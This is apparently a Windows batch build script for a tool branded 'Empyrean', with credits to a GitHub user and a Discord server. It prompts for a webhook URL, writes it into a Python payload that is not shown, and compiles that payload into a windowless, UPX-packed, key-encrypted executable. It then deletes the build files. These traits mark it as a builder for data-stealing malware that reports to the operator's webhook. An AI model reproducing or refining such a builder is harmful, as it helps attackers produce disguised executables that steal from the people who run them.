@ECHO OFF
@MODE 101,50

:::
:::       _______  ___      ___    _______  ___  ___  _______    _______       __      _____  ___   
:::      /"     "||"  \    /"  |  |   __ "\|"  \/"  |/"      \  /"     "|     /""\    (\"   \|"  \  
:::     (: ______) \   \  //   |  (. |__) :)\   \  /|:        |(: ______)    /    \   |.\\   \    | 
:::      \/    |   /\\  \/.    |  |:  ____/  \\  \/ |_____/   ) \/    |     /' /\  \  |: \.   \\  | 
:::      // ___)_ |: \.        |  (|  /      /   /   //      /  // ___)_   //  __'  \ |.  \    \. | 
:::     (:      "||.  \    /:  | /|__/ \    /   /   |:  __   \ (:      "| /   /  \\  \|    \    \ | 
:::      \_______)|___|\__/|___|(_______)  |___/    |__|  \___) \_______)(___/    \___)\___|\____\) 
:::     
:::                                     Made by github.com/addi00000
:::                                        discord.gg/G52tYpJWnQ
:::     
FOR /F "DELIMS=: TOKENS=*" %%A IN ('FINDSTR /B ::: "%~f0"') DO @ECHO(%%A

PY -3.10 -c "exec('''with open('main.py', 'r', encoding='utf-8') as f: content = f.read().replace('WEBHOOK_URL', str(input('    Webhook URL: ')))\nwith open('built.py', 'w', encoding='utf-8') as f: f.write(content)''')"
ECHO INTALLING REQUIREMENTS && PY -3.10 -m pip install --upgrade -r requirements.txt
ECHO INSTALLING UPX && curl -L -O https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip && tar -xf upx-3.96-win64.zip 
ECHO COMPILING TO EXE && PY -3.10 -m PyInstaller --onefile --noconsole --upx-dir ./upx-3.96-win64 -i NONE --distpath ./ --key EMPYREAN .\built.py 
ECHO REMOVING BUILD FILES && PY -3.10 -c "import os;import shutil;exec('''for file in ['build', '__pycache__', 'built.spec', 'built.py', 'upx-3.96-win64.zip', 'upx-3.96-win64', 'python-3.10.5-amd64.exe']:\n    if os.path.exists(file): os.remove(file) if os.path.isfile(file) else shutil.rmtree(file)''')      "
COLOR 02 && ECHO DONE && ECHO EXE GENERATED AS BUILT.EXE && START .
PAUSE && COLOR 07 && EXIT